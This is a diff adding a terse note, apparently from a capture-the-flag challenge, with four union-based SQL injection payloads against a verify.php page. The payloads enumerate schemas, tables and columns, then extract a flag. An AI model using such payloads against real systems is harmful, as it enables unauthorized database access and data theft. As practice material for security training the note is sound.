@@ -1,0 +1,10 @@
+sqli in page
+http://52.197.140.254/are_you_rich/verify.php
+
+xxx' or '1'='0' union select group_concat(schema_name) from information_schema.schemata limit 0,1-- -
+
+xxx' or '1'='0' union select group_concat(table_name) from information_schema.tables where table_schema=database() limit 1,1-- -
+
+xxx' or '1'='0' union select group_concat(column_name) from information_schema.columns where table_name=0x666c616731 limit 1,1-- -
+
+xxx' or '1'='0' union select group_concat(flag) from areyourich.flag1 limit 0,1-- -
